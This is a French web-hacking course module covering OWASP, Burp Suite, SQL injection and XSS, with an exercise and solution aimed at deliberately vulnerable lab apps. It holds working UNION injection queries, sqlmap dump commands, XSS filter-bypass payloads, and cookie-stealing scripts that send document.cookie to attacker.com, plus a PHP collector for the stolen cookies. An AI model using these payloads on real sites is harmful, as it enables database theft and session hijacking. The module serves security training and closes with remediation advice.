---
tags:
  - hacking
  - web
  - burp
  - owasp
  - sqli
  - formation
---

# Module 3 : Web Hacking

Le Web est la plus grande surface d'attaque.

## 1. OWASP Top 10

La liste des 10 failles les plus critiques (mise à jour régulièrement).
1.  **Broken Access Control** : Accéder à l'admin sans être admin.
2.  **Cryptographic Failures** : Données en clair, algos faibles.
3.  **Injection** : SQL, Command, LDAP injection.
4.  **Insecure Design** : Faille de logique métier.
5.  **Security Misconfiguration** : Config par défaut, headers manquants.

## 2. Burp Suite : L'Outil Ultime

Burp est un **Proxy**. Il se place entre votre navigateur et le serveur web.
Vous pouvez voir, modifier et rejouer chaque requête HTTP.

### Setup
1.  Lancer Burp Suite Community.
2.  Configurer le navigateur pour utiliser le proxy `127.0.0.1:8080`.
3.  Installer le certificat CA de Burp pour intercepter le HTTPS.

### Fonctionnalités Clés
*   **Proxy (Intercept)** : Arrêter une requête en vol, changer `admin=false` en `admin=true`, et l'envoyer.
*   **Repeater** : Rejouer une requête en modifiant des paramètres pour tester des injections.
*   **Intruder** : Bruteforce (Fuzzing) sur des paramètres.

## 3. Injections SQL (SQLi)

Le serveur exécute votre code SQL au lieu de la requête prévue.

### Test Manuel
Ajouter `'` (quote) dans un champ. Si vous voyez une erreur SQL, c'est gagné.
`http://site.com/article?id=1'` -> `Error: You have an error in your SQL syntax...`

### Exploitation (UNION)
Récupérer des données d'autres tables.
`http://site.com/article?id=1 UNION SELECT username, password FROM users`

### Automatisation : SQLmap
```bash
sqlmap -u "http://site.com/article?id=1" --dbs
sqlmap -u "http://site.com/article?id=1" -D users --tables
sqlmap -u "http://site.com/article?id=1" -D users -T accounts --dump
```

## 4. Cross-Site Scripting (XSS)

Injecter du JavaScript qui s'exécute dans le navigateur de la victime.

*   **Reflected** : Le script est dans l'URL (Lien piégé).
*   **Stored** : Le script est stocké en BDD (Commentaire de blog).

**Payload de test :**
```html
<script>alert('Hacked')</script>
<img src=x onerror=alert(1)>
```

**Impact :** Vol de cookie de session (Session Hijacking).
```html
<script>fetch('http://hacker.com/?cookie=' + document.cookie)</script>
```

---

## Exercice Pratique

!!! example "Exercice : Exploitation de Vulnérabilités Web"

    **Objectif** : Identifier et exploiter une injection SQL et une faille XSS.

    **Prérequis** :
    - Application web vulnérable (DVWA, WebGoat, ou bWAPP)
    - Burp Suite Community installé
    - Navigateur configuré avec le proxy Burp

    **Partie 1 : Injection SQL**

    1. **Identification** : Testez les champs d'entrée avec une quote simple `'`
       - URL cible : `http://vulnerable-app.local/user?id=1`
       - Ajoutez `'` après le paramètre : `?id=1'`

    2. **Vérification** : Confirmez la vulnérabilité avec un test UNION
       ```sql
       ?id=1' UNION SELECT NULL--
       ?id=1' UNION SELECT NULL, NULL--
       ```

    3. **Extraction** : Récupérez les données sensibles
       ```sql
       ?id=1' UNION SELECT username, password FROM users--
       ```

    4. **Automatisation** : Utilisez SQLmap pour dumper la base
       ```bash
       sqlmap -u "http://vulnerable-app.local/user?id=1" --dbs
       sqlmap -u "http://vulnerable-app.local/user?id=1" -D webapp --tables
       sqlmap -u "http://vulnerable-app.local/user?id=1" -D webapp -T users --dump
       ```

    **Partie 2 : Cross-Site Scripting (XSS)**

    1. **Test Reflected XSS** : Dans un champ de recherche, injectez :
       ```html
       <script>alert('XSS')</script>
       ```

    2. **Bypass de Filtres** : Si le premier payload est bloqué, testez :
       ```html
       <img src=x onerror=alert(1)>
       <svg onload=alert(1)>
       "><script>alert(String.fromCharCode(88,83,83))</script>
       ```

    3. **Exploitation Réelle** : Vol de cookie de session
       ```html
       <script>
       fetch('http://attacker.com/steal?c=' + document.cookie)
       </script>
       ```

    **Questions** :
    - Combien de colonnes comporte la table vulnérable ?
    - Quels utilisateurs et mots de passe avez-vous récupérés ?
    - Le XSS trouvé est-il Reflected ou Stored ?

??? quote "Solution"

    **Partie 1 : Injection SQL**

    **Identification** :
    ```text
    http://vulnerable-app.local/user?id=1'
    # Résultat : "You have an error in your SQL syntax..." -> VULNÉRABLE
    ```

    **Détermination du nombre de colonnes** :
    ```sql
    ?id=1' UNION SELECT NULL--           # Erreur
    ?id=1' UNION SELECT NULL, NULL--     # Erreur
    ?id=1' UNION SELECT NULL, NULL, NULL-- # Succès ! 3 colonnes
    ```

    **Extraction de données** :
    ```sql
    # Liste des bases de données
    ?id=1' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata--

    # Tables de la base 'webapp'
    ?id=1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema='webapp'--

    # Colonnes de la table 'users'
    ?id=1' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--

    # Extraction finale
    ?id=1' UNION SELECT NULL, username, password FROM users--
    ```

    **Résultats obtenus** :
    ```text
    admin:5f4dcc3b5aa765d61d8327deb882cf99 (MD5 de "password")
    john:e10adc3949ba59abbe56e057f20f883e (MD5 de "123456")
    ```

    **Avec SQLmap** :
    ```bash
    sqlmap -u "http://vulnerable-app.local/user?id=1" --batch --dump
    # [INFO] fetched data logged to '/root/.sqlmap/output/vulnerable-app.local'
    # Database: webapp
    # Table: users
    # [3 entries]
    # +----+----------+----------------------------------+
    # | id | username | password                         |
    # +----+----------+----------------------------------+
    # | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
    # | 2  | john     | e10adc3949ba59abbe56e057f20f883e |
    # | 3  | alice    | 098f6bcd4621d373cade4e832627b4f6 |
    # +----+----------+----------------------------------+
    ```

    **Partie 2 : XSS**

    **Test basique réussi** :
    ```html
    <script>alert('XSS')</script>
    # Une popup s'affiche -> VULNÉRABLE
    ```

    **Exploitation pour vol de cookie** :
    ```html
    <script>
    var img = new Image();
    img.src = 'http://attacker.com/log.php?cookie=' + document.cookie;
    </script>
    ```

    **Serveur attaquant (log.php)** :
    ```php
    <?php
    file_put_contents('cookies.txt', $_GET['cookie']."\n", FILE_APPEND);
    ?>
    ```

    **Cookie récupéré** :
    ```text
    PHPSESSID=a3fWa53rs2d334; user=admin; role=administrator
    ```

    **Type de XSS** : Reflected (le payload est dans l'URL, pas stocké en base)

    **Recommandations** :
    1. **SQL Injection** :
       - Utiliser des requêtes préparées (Prepared Statements)
       - Valider et assainir toutes les entrées utilisateur
       - Principe du moindre privilège pour les comptes DB

    2. **XSS** :
       - Encoder toutes les sorties HTML (htmlspecialchars)
       - Implémenter Content Security Policy (CSP)
       - Valider les entrées côté serveur
       - Utiliser le flag HttpOnly pour les cookies de session

---

## Navigation

| | |
|:---|---:|
| [← Module 2 : Reconnaissance & Réseau](02-module.md) | [Module 4 : Active Directory Hacking →](04-module.md) |

[Retour au Programme](index.md){ .md-button }
